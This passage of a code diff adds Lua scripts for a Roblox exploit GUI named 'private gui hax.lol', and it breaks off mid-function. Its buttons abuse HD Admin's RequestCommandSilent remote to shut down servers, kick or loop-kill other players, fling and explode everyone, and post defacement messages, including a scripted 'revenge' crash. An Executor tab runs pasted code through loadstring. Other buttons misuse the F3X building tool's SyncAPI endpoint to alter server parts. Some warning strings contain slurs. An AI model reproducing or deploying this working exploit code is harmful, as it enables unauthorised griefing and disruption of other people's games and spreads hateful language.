+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";re all")
+	end)
+end;
+task.spawn(C_1e7);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1e9()
+local script = G2L["1e9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";serverhint game destroyed by elv4r0x loll")
+	end)
+end;
+task.spawn(C_1e9);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1eb()
+local script = G2L["1eb"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";servermessage get destroyed by elv4r0x!1")
+	end)
+end;
+task.spawn(C_1eb);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1ed()
+local script = G2L["1ed"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";disco")
+	end)
+end;
+task.spawn(C_1ed);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1ef()
+local script = G2L["1ef"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";undisco")
+	end)
+end;
+task.spawn(C_1ef);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1f1()
+local script = G2L["1f1"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";notice all Elv4r0x Was Here...")
+	end)
+end;
+task.spawn(C_1f1);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1f3()
+local script = G2L["1f3"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";loopkill others")
+	end)
+end;
+task.spawn(C_1f3);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1f5()
+local script = G2L["1f5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";unloopkill others")
+	end)
+end;
+task.spawn(C_1f5);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1f7()
+local script = G2L["1f7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";fling all")
+	end)
+end;
+task.spawn(C_1f7);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1f9()
+local script = G2L["1f9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sword all")
+	end)
+end;
+task.spawn(C_1f9);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1fb()
+local script = G2L["1fb"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";char all k00pkiddAlt")
+	end)
+end;
+task.spawn(C_1fb);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1fd()
+local script = G2L["1fd"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- 1x1x1x1 revenge hd admin script by elv4r0x
+		-- also has kick cuz the other ones has no kicks cmd, so yea
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sm 1x1x1x1: MUHAHAHAHAHHAHAHAHAHAH")
+		wait(4)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sm 1x1x1x1: prepare for a the punishment because of me getting banned")
+		wait(5)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sm 1x1x1x1: YOU WILL ALL PAY FOR ME BEING BANNED!")
+		wait(5)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sh 1x1x1x1 the server will end.")
+		wait(5)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sh 1x1x1x1 is shutting it down the server. MUAHAHAHAHAHAHAH. Crashing in, 3, 2, 1")
+		wait(5)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";shutdown")
+	end)
+end;
+task.spawn(C_1fd);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1ff()
+local script = G2L["1ff"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";kick others")
+	end)
+end;
+task.spawn(C_1ff);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_201()
+local script = G2L["201"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";shutdown")
+	end)
+end;
+task.spawn(C_201);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_203()
+local script = G2L["203"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";speed all 50")
+	end)
+end;
+task.spawn(C_203);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_205()
+local script = G2L["205"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";fling all")
+		task.wait(0.50)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";explode all")
+	end)
+end;
+task.spawn(C_205);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_207()
+local script = G2L["207"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";titley me Elv4r0x")
+	end)
+end;
+task.spawn(C_207);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_209()
+local script = G2L["209"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";titley me REAL ELV4R0X")
+	end)
+end;
+task.spawn(C_209);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_20b()
+local script = G2L["20b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";title all rekted by elv4r0x")
+	end)
+end;
+task.spawn(C_20b);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_20d()
+local script = G2L["20d"];
+	script.Parent.MouseButton1Click:Connect(function()
+	    game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";char all c00lgui")
+	end)
+end;
+task.spawn(C_20d);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.HintBTN.LocalScript
+function C_211()
+local script = G2L["211"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local hinttxt = script.Parent.Parent.TextBoxHint.Text
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sh " .. hinttxt)
+	end)
+end;
+task.spawn(C_211);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.MessageBTN.LocalScript
+function C_213()
+local script = G2L["213"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local messagetxt = script.Parent.Parent.TextBoxMessage.Text
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sm " .. messagetxt)
+	end)
+	
+	-- fixed script bruhhhhhhhhhh
+end;
+task.spawn(C_213);
+-- StarterGui.private gui hax.lol.Executor tab Page.Execute.LocalScript
+function C_218()
+local script = G2L["218"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(script.Parent.Parent.Scroll.Source.Text)()
+	end)
+end;
+task.spawn(C_218);
+-- StarterGui.private gui hax.lol.Executor tab Page.Clear.LocalScript
+function C_21a()
+local script = G2L["21a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Scroll.Source.Text = ''
+	end)
+end;
+task.spawn(C_21a);
+-- StarterGui.private gui hax.lol.Executor tab Page.btn.LocalScript
+function C_21c()
+local script = G2L["21c"];
+	script.Parent.MouseButton1Click:Connect(function() script.Parent.Parent.censorScript.Visible = not script.Parent.Parent.censorScript.Visible script.Parent.Text = script.Parent.Parent.censorScript.Visible and "Hide: On" or "Hide: Off" end)
+end;
+task.spawn(C_21c);
+-- StarterGui.private gui hax.lol.Dragify
+function C_220()
+local script = G2L["220"];
+	local UIS = game:GetService('UserInputService')
+	local TweenService = game:GetService('TweenService')
+	
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.13
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+		TweenService:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+end;
+task.spawn(C_220);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_227()
+local script = G2L["227"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local warned = false
+	
+		-- Mesh Types
+		local meshTypes = {
+			Enum.MeshType.Brick,
+			Enum.MeshType.Cylinder,
+			Enum.MeshType.Head,
+			Enum.MeshType.Sphere,
+			Enum.MeshType.Wedge
+		}
+	
+		-- หาเครื่องมือ SyncAPI
+		local function getBuildingTool(player)
+			for _, container in ipairs({player.Character, player.Backpack}) do
+				if container then
+					for _, item in ipairs(container:GetChildren()) do
+						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+							return item
+						end
+					end
+				end
+			end
+			return nil
+		end
+	
+		-- ลบ Mesh เดิม
+		local function removemesh(part)
+			for _, child in ipairs(part:GetChildren()) do
+				if child:IsA("MeshPart") or child:IsA("SpecialMesh") then
+					local args = {"Remove", { child }}
+					local tool = getBuildingTool(player)
+					if tool then
+						tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+					elseif not warned then
+						warn("Building tool not found")
+						warned = true
+					end
+				end
+			end
+		end
+	
+		-- ตรวจสอบว่าเป็น Accessory หรือ Handle ของ Accessory
+		local function isAccessoryPart(part)
+			if part:IsA("Accessory") then
+				return true
+			end
+			if part.Parent and part.Parent:IsA("Accessory") then
+				return true
+			end
+			return false
+		end
+	
+		-- สร้าง Mesh ใหม่
+		local function applymesh(part)
+			if isAccessoryPart(part) then
+				return -- ข้ามหมวก/Accessory
+			end
+	
+			removemesh(part)
+	
+			local currentMeshType
+			local mesh = part:FindFirstChildWhichIsA("SpecialMesh")
+			if mesh then
+				currentMeshType = mesh.MeshType
+			end
+	
+			local availableTypes = {}
+			for _, mt in ipairs(meshTypes) do
+				if mt ~= currentMeshType then
+					table.insert(availableTypes, mt)
+				end
+			end
+			local randomMeshType = availableTypes[math.random(1, #availableTypes)]
+	
+			local tool = getBuildingTool(player)
+			if tool then
+				local argsCreate = {"CreateMeshes", {{ Part = part }}}
+				local argsSync   = {"SyncMesh",     {{ MeshType = randomMeshType, Part = part }}}
+				tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
+				tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
+			elseif not warned then
+				warn("Building tool not found")
+				warned = true
+			end
+		end
+	
+		-- เปลี่ยน Mesh ของตัวละคร
+		local function randomizeCharacterMeshes(character)
+			for _, obj in ipairs(character:GetDescendants()) do
+				if (obj:IsA("Part") or obj:IsA("MeshPart")) and not isAccessoryPart(obj) then
+					applymesh(obj)
+				end
+			end
+		end
+	
+		-- หา SyncAPI Tool และฟังก์ชันเปลี่ยนสี
+		local tool
+		for _, v in ipairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then tool = v.Parent end
+		end
+		for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+			if v.Name == "SyncAPI" then tool = v.Parent end
+		end
+		local remote = tool.SyncAPI.ServerEndpoint
+		function _(args) remote:InvokeServer(unpack(args)) end
+	
+		-- ฟังก์ชันเปลี่ยนสีตัวละคร
+		function a()
+			local presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
+			spawn(function()
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character.Head,["UnionColoring"]=true},
+						[2] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character.HumanoidRootPart,["UnionColoring"]=true},
+						[3] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Left Arm"),["UnionColoring"]=true},
+						[4] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Right Leg"),["UnionColoring"]=true},
+						[5] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character.Torso,["UnionColoring"]=true},
+						[6] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Right Arm"),["UnionColoring"]=true},
+						[7] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Left Leg"),["UnionColoring"]=true}
+					}
+				}
+				_(args)
+			end)
+		end
+	
+		-- ลูปหลัก
+		while true do
+			if player.Character then
+				randomizeCharacterMeshes(player.Character)
+			end
+			wait()
+			spawn(a)
+		end
+	
+	
+	end)
+end;
+task.spawn(C_227);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_229()
+local script = G2L["229"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+	
+		-- find shit
+		local tool
+		for _, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+		for _, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+		if not tool then
+			warn("ไม่พบ SyncAPI Tool!")
+			return
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+	
+		local head = char:FindFirstChild("Head")
+		if not head then
+			warn("fuck fagz")
+			return
+		end
+		local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
+		if not headMesh then
+			warn("nigga")
+			return
+		end
+	
+	
+		local hats = {}
+		for _, hat in pairs(char:GetChildren()) do
+			if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then
+				local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")
+				if handleMesh then
+					table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})
+				end
+			end
+		end
+	
+	
+		local amplitude = 0.7
+		local frequency = 6 
+		local t = 0
+	
+		local RunService = game:GetService("RunService")
+		RunService.RenderStepped:Connect(function(dt)
+			t = t + dt * frequency
+			local offsetValue = math.sin(t) * amplitude
+	
+	
+			local partsToSync = {
+				{Part = head, MeshId = headMesh.MeshId, Offset = Vector3.new(offsetValue, 0, 0)}
+			}
+			for _, h in pairs(hats) do
+				table.insert(partsToSync, {Part = h.Part, MeshId = h.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})
+			end
+	
+			remote:InvokeServer("SyncMesh", partsToSync)
+		end)
+	
+	end)
+end;
+task.spawn(C_229);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_22b()
+local script = G2L["22b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+	
+		local tool
+	
+		for i, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		for i, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		function CreatePart(cf, parent, types)
+			local args = {
+				[1] = "CreatePart",
+				[2] = types or "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+	
+		function Resize(part, size, cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function MovePart(part, cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Color(part, color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetShape(part, shape)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Shape"] = shape
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetCollision(part, boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetLocked(part, boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = { [1] = part },
+				[3] = boolean
+			}
+			_(args)
+		end
+	
+		-- Build pad under player
+		local padPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
+		CreatePart(padPos, workspace, "Cylinder")
+		task.wait(0.1)
+	
+		local floatingPad
+	
+		for i, v in workspace:GetChildren() do
+			if v:IsA("BasePart")
+				and (v.CFrame.Position - padPos.Position).Magnitude < 5
+				and not v.Parent:FindFirstChild("Humanoid")
+			then
+				floatingPad = v
+	
+				Resize(floatingPad, Vector3.new(0.5, 8, 8), padPos * CFrame.Angles(0, 0, math.rad(90)))
+				Color(floatingPad, Color3.fromRGB(107, 50, 124))
+				SetCollision(floatingPad, true)
+				SetLocked(floatingPad, true)
+	
+				break
+			end
+		end
+	
+		if floatingPad then
+			local RunService = game:GetService("RunService")
+	
+			RunService.Heartbeat:Connect(function()
+				pcall(function()
+					if char and char:FindFirstChild("HumanoidRootPart") then
+						local targetPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
+						MovePart(floatingPad, targetPos * CFrame.Angles(0, 0, math.rad(90)))
+					end
+				end)
+			end)
+		end
+	end)
+end;
+task.spawn(C_22b);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_22d()
+local script = G2L["22d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+	
+		local UserInputService = game:GetService("UserInputService")
+		local RunService = game:GetService("RunService")
+	
+		local holding = false
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function color(part, color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function name(part, stringa)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringa
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function lock(part, boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function createdecal(part, side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+		local function setdecal(part, asset, side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function setanchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local tool = Instance.new("Tool")
+		tool.Parent = player.Backpack
+		tool.Name = "Money Bag"
+		tool.RequiresHandle = false
+		tool.TextureId = "http://www.roblox.com/asset/?id=16659163"
+	
+		local debounce = false
+	
+		tool.Activated:Connect(function()
+			if debounce == false then
+				debounce = true
+				for i = 1, 5 do
+					spawn(function()
+						local offset = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).Unit
+						local pos = char.HumanoidRootPart.CFrame * CFrame.new(offset) * CFrame.new(0, 4, 0)
+						local buck = serverendpoint:InvokeServer("CreatePart", "Normal", pos, workspace)
+						name(buck, "MONEY")
+						lock(buck, true)
+						resize(buck, Vector3.new(2, 0.4, 1), pos)
+						color(buck, Color3.new(0.156863, 0.498039, 0.278431))
+						setanchor(buck, false)
+	
+						createdecal(buck, Enum.NormalId.Top)
+						setdecal(buck, "16658163", Enum.NormalId.Top)
+	
+						task.wait(10)
+						delete(buck)
+					end)
+				end
+				task.wait(1)
+				debounce = false
+			end
+		end)
+	end)
+end;
+task.spawn(C_22d);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_22f()
+local script = G2L["22f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+	
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+	
+		local tool
+		for _, v in ipairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		if not tool then return end
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local humanoid = char:WaitForChild("Humanoid")
+		if humanoid.RigType ~= Enum.HumanoidRigType.R6 then return end
+	
+		local torso = char:WaitForChild("Torso")
+		local rightShoulder = torso:WaitForChild("Right Shoulder")
+		local leftShoulder = torso:WaitForChild("Left Shoulder")
+	
+		local CFNew, CFAng = CFrame.new, CFrame.Angles
+		local forwardOffset = 0.5
+	
+		RunService.RenderStepped:Connect(function()
+			-- RIGHT ARM: upside down + facing right + moved fully back beside torso
+			rightShoulder.C0 =
+				CFNew(1.4, 0.5, -forwardOffset + 1)  -- moved back significantly
+				* CFAng(math.rad(180), 0, math.rad(90))
+	
+			-- LEFT ARM unchanged
+			leftShoulder.C0 =
+				CFNew(-1.4, 0.5, -forwardOffset)
+				* CFAng(0, 0, math.rad(-90))
+	
+			remote:InvokeServer("SyncJoints", {
+				{Joint = rightShoulder, C0 = rightShoulder.C0},
+				{Joint = leftShoulder, C0 = leftShoulder.C0}
+			})
+		end)
+	end)
+end;
+task.spawn(C_22f);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_231()
+local script = G2L["231"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- dev uzi f3x by voidcore edited by me
+	
+		local replicatedStorage = game:GetService("ReplicatedStorage")
+		local runService = game:GetService("RunService")
+		local players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+	
+		local rq = replicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		pcall(function() rq:InvokeServer(";invis") end)
+	
+		local player = players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hum = char:WaitForChild("Humanoid")
+		local hed = char:WaitForChild("Head")
+		char.Animate.Disabled = false
+	
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+		if not tool then
+			for i,v in replicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+		if not tool then
+			warn("SyncAPI not found")
+			return
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.spawn(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function createPart(cf, parent)
+			return remote:InvokeServer("CreatePart", "Normal", cf, parent)
+		end
+	
+		local function movePart(part, cf)
+			ohno({"SyncMove", {{["Part"] = part, ["CFrame"] = cf}}})
+		end
+	
+		local function resize(part, size, cf)
+			ohno({"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}})
+		end
+	
+		local function colorPart(part, color)
+			ohno({"SyncColor", {{["Part"] = part, ["Color"] = color, ["UnionColoring"] = false}}})
+		end
+	
+		local function setCollision(part, val)
+			ohno({"SyncCollision", {{["Part"] = part, ["CanCollide"] = val}}})
+		end
+	
+		local function setAnchor(part, val)
+			ohno({"SyncAnchor", {{["Part"] = part, ["Anchored"] = val}}})
+		end
+	
+		local function addMesh(part)
+			ohno({"CreateMeshes", {{["Part"] = part}}})
+		end
+	
+		local function setMesh(part, meshid, scale)
+			local args = {"SyncMesh", {{["Part"] = part}}}
+			if meshid then args[2][1]["MeshId"] = "rbxassetid://"..meshid end
+			if scale then args[2][1]["Scale"] = scale end
+			ohno(args)
+		end
+	
+		local function spawnDecal(part, side)
+			ohno({"CreateTextures", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal"}}})
+		end
+	
+		local function addDecal(part, asset, side)
+			ohno({"SyncTexture", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal", ["Texture"] = asset}}})
+		end
+	
+		local cf = CFrame.new()
+		local larm = char["Left Arm"]
+		local rarm = char["Right Arm"]
+		local lleg = char["Left Leg"]
+		local rleg = char["Right Leg"]
+		local trs = char.Torso
+		local hd = char.Head
+	
+		local nlarm = createPart(cf, char)
+		local nrarm = createPart(cf, char)
+		local nlleg = createPart(cf, char)
+		local nrleg = createPart(cf, char)
+		local ntrs = createPart(cf, char)
+		local nhd = createPart(cf, char)
+	
+		local function setupPart(part, size, cframe, color, meshid, meshscale)
+			resize(part, size, cframe)
+			colorPart(part, color)
+			setCollision(part, false)
+			setAnchor(part, true)
+			if meshid then
+				addMesh(part)
+				setMesh(part, meshid, meshscale)
+			end
+		end
+	
+		setupPart(nlarm, larm.Size, larm.CFrame, larm.Color, "127739625807358")
+		setupPart(nrarm, rarm.Size, rarm.CFrame, rarm.Color, "127739625807358")
+		setupPart(nlleg, lleg.Size, lleg.CFrame, lleg.Color, "127739625807358")
+		setupPart(nrleg, rleg.Size, rleg.CFrame, rleg.Color, "127739625807358")
+		setupPart(ntrs, trs.Size, trs.CFrame, trs.Color, "2027989253")
+		setupPart(nhd, hd.Size, hd.CFrame, hd.Color)
+	
+		addMesh(nhd)
+		setMesh(nhd, nil, Vector3.new(1.25, 1.25, 1.25))
+	
+		if hd:FindFirstChildOfClass("SpecialMesh") then
+			local mesh = hd:FindFirstChildOfClass("SpecialMesh")
+			if mesh.MeshType == Enum.MeshType.FileMesh then
+				addMesh(nhd)
